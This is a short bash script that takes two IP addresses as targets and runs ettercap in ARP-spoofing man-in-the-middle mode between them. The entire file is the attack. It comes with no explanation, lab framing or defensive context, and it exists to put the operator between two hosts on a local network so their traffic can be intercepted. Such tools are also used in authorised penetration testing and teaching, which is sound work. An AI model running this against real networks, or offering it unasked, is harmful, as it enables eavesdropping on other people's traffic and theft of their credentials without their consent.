#!/bin/env bash

[ -z $1 -o -z $2 ] && echo "Please provide the ip addresses of your two targets" && exit

echo Target A: /$1/
echo Target B: /$2/
ettercap --only-mitm -s -M arp /$1/ /$2/
